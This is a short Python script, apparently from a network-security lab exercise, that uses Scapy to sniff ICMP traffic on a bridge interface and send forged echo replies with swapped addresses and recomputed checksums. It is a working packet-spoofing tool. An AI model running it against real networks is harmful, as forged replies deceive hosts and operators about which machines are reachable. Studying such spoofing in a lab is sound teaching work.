from scapy.all import *
def spoof_pkt(pkt):
    a = IP()
    a.src = pkt[IP].dst # Spoofing source IP address
    a.dst = pkt[IP].src # Spoofing destination IP address
    b = pkt[ICMP]
    b.type = 0 # Spoofing
    del b.chksum # I found this part of the code to be very important. I think the correct checksum will be calculated and replaced before sending the packet
    send(a/b)

pkt = sniff(iface='br-226773aa8681', filter='icmp', prn=spoof_pkt) # Sniffing
